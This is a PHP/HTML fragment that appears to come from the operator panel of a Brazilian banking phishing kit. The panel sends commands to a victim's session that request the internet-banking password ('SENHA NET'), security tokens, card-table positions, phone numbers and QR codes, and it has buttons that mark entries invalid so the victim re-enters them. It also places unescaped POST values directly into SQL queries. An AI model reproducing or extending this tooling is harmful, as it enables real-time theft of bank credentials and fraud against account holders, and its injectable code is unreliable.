...
if(isset($_POST['send_name']) && isset($_POST['send_id_user'])):
	...
	update($conn, "acessos", "comando = 'GET_PSN', nome = '$SendNameUser'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');		
...
elseif(isset($_POST['send_nota']) && isset($_POST['send_id_user'])):
	...
	header('Location: acesso.php');	
elseif(isset($_POST['send_qrcode']) && isset($_POST['send_id_user'])):
	$SendIdUser = $_POST['send_id_user'];
	$SendQrCode = $_POST['send_qrcode'];
	update($conn, "acessos", "comando = 'GET_QRCODE', qrcode_link = '$SendQrCode'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');	
	...
	<div class="gerenciamento fisico" style="display:<?php echo $Gerenciamento;?>">
		...
		<div class="block_commands" style="display:<?php echo $ManageFisica;?>">
			...
			<div class="block_erros_commands">
				...
				<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&send=inv_pos" class="last">POSIÇÃO X</a>
				<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&send=inv_tks">TOKEN X</a>
				<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&send=inv_phone">TELEFONE X</a>
				<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&send=finalizar" class="finaliza_user last"><i class="fa fa-close"></i> &nbsp;FINALIZA</a>
				<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&send=get_nota" class="anotacao_user"><i class="fa fa-pencil"></i> &nbsp;ANOTAÇÃO</a>
				<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&send=get_qrcode" class="anotacao_user" style="background-color:#f09!important;"><i class="fa fa-qrcode"></i> &nbsp;QRCODE</a>
				<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&send=inv_qrcode" class="last">QRCODE X</a>
			...
			<div class="block_get_commands">
				<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&send=get_nome"><i class="fa fa-get-pocket"></i> &nbsp;NOME</a>
				<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&send=get_pos"><i class="fa fa-get-pocket"></i> &nbsp;POSIÇÃO</a>
				<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&send=get_table" class="last">TABELA</a>
				<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&send=get_psn">SENHA NET</a>
			...
			<div class="block_aditions">
				...
				<form action="acesso.php" method="post" style="display:<?php echo $displaySendQrCode;?>;" id="FormQrCode">
					<label for="send_qrcode">
						<span class="star_span"><i class="fa fa-user"></i></span>
						<input type="text" id="send_qrcode" name="send_qrcode" placeholder="Link Imagem QrCode" class="normal_input" autocomplete="off">
						<input type="hidden" name="send_id_user" value="<?php echo $SendIdUser;?>">
						<span class="final_span" onclick="document.getElementById('FormQrCode').submit();"><i class="fa fa-send"></i></span>
					</label>
				</form>
		...
		<div class="block_commands" style="display:<?php echo $ManageJuba;?>">
			...
			<div class="block_erros_commands">
				...
				<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&send=inv_tks">TOKEN X</a>
				<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&send=finalizar" class="finaliza_user last"><i class="fa fa-close"></i> &nbsp;FINALIZA</a>
				<a href="?gerenciar_juba=<?php echo $SendIdUser;?>&send=get_nota" class="anotacao_user"><i class="fa fa-pencil"></i> &nbsp;ANOTAÇÃO</a>
			</div><!-- block_erros_commands -->
			...
			<div class="block_get_commands">
				<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&send=get_tks">TOKEN</a>
			</div><!-- block_get_commands -->
			...
			<div class="block_aditions">
				...
				<form action="acesso.php" method="post" style="display:<?php echo $displaySendNota;?>;" id="FormNotaJuba">
					<label for="send_nota">
						<span class="star_span"><i class="fa fa-user"></i></span>
						<input type="text" id="send_nota" name="send_nota" placeholder="Anotação" class="normal_input" autocomplete="off">
						<input type="hidden" name="send_id_user" value="<?php echo $SendIdUser;?>">
